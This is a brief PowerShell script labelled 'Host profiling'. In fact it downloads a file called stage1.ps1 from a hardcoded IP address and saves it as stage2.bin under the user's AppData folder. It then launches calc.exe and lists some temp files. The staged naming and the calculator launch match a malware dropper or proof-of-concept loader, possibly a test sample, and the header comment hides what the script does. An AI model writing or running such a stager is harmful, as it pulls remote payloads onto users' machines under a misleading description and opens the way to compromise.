<# Host profiling #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.78/stage1.ps1",
    [string]$OutputPath = "$env:APPDATA\stage2.bin",
    [int]$StageTimeout = 71
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
